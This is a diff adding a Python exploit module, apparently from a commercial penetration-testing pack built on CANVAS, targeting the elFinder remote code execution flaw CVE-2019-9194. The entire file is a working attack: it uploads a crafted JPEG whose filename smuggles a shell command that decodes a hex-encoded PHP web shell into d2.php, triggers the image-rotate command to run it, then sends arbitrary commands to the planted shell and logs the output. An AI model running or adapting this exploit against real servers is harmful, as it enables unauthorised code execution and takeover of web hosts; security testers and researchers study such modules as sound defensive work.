@@ -1,0 +1,136 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2019
+#
+
+import sys
+import time
+import os
+import random
+import re
+import urllib
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "elFinder Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote Code Execution in elFinder"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "elFinder"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "elFinder < 2.1.48"
+DOCUMENTATION["Date public"] = "2019.03.04"
+DOCUMENTATION["References"] = "https://www.secsignal.org/news/cve-2019-9194-triggering-and-exploiting-a-1-day-vulnerability/"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2019-9194"
+DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9194"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["All"] ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""    
+    self.cmd = "id"        
+    self.basepath = "/"    
+    self.protocol = "http"
+    self.port = 80
+    self.sslport = 443
+    self.https = 1
+    self.name = NAME
+    return
+
+	
+  def upload_file(self):               
+    if self.https == 0:
+        self.protocol = "http"
+    else:
+        self.protocol = "https"
+        self.port = self.sslport
+    
+    ua = spkproxy.UserAgent("", exploit=self)
+
+    # Upload file
+    data = '\xFF\xD8\xFF\xDB\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0A\x0A\x09\x08\x09\x09\x0A\x0C\x0F\x0C\x0A\x0B\x0E\x0B\x09\x09\x0D\x11\x0D\x0E\x0F\x10\x10\x11\x10\x0A\x0C\x12\x13\x12\x10\x13\x0F\x10\x10\x10\xFF\xC9\x00\x0B\x08\x00\x01\x00\x01\x01\x01\x11\x00\xFF\xCC\x00\x06\x00\x10\x10\x05\xFF\xDA\x00\x08\x01\x01\x00\x00\x3F\x00\xD2\xCF\x20\xFF\xD9\x3C\x3F\x70\x68\x70\x69\x6E\x66\x6F\x28\x29\x3B\x3F\x3E'                
+    params = '-----------------880735062871553\r\nContent-Disposition: form-data; name="cmd"\r\n\r\nupload\r\n-----------------880735062871553\r\nContent-Disposition: form-data; name="target"\r\n\r\nl1_Lw\r\n-----------------880735062871553\r\nContent-Disposition: form-data; name="mtime[]"\r\n\r\n1497726174\r\n-----------------880735062871553\r\nContent-Disposition: form-data; name="upload[]"; filename="d2.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > d2.php;echo d2.jpg"\r\nContent-Length: %d\r\n\r\n%s\r\n-----------------880735062871553--\r\n'%(len(data), data)      
+    url = '/php/connector.minimal.php'        
+    mainurl = "%s://%s:%d/%s%s" % (self.protocol, self.host, self.port, self.basepath, url)
+    ua.addHeader("Content-Type", "multipart/form-data; boundary=---------------880735062871553") 
+    ua.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1")       
+    data = ua.POST(mainurl, params)
+    m = re.search('"hash":"([^"]+)"', data)
+    if m is None:
+        self.log('[D2] Hash not found')
+        return 0
+    h = m.group(1) 
+
+    # Rotate image
+    url = '/php/connector.minimal.php?target=%s&width=100&height=100&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c'%h        
+    mainurl = "%s://%s:%d/%s%s" % (self.protocol, self.host, self.port, self.basepath, url)     
+    ua.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1")       
+    data = ua.GET(mainurl)
+        	
+    # Execute uploaded file
+    url = "/php/d2.php?c=%s"%urllib.quote(self.cmd)
+    mainurl = "%s://%s:%d/%s%s" % (self.protocol, self.host, self.port, self.basepath, url)
+    data = ua.GET(mainurl)    
+    self.log('[D2] Output:\n%s'%data)
+                		
+    return 1
+
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.sslport = int(self.argsDict.get("sslport", self.sslport))
+    self.https = int(self.argsDict.get("https", self.https))
+    self.basepath = self.argsDict.get("basepath", self.basepath)     
+    self.cmd = self.argsDict.get("cmd", self.cmd)
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s"%(NAME,self.host))
+ 
+    ret = self.upload_file()
+    
+    self.setInfo("%s attacking %s - done"%(NAME, self.host))
+    
+    return ret
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
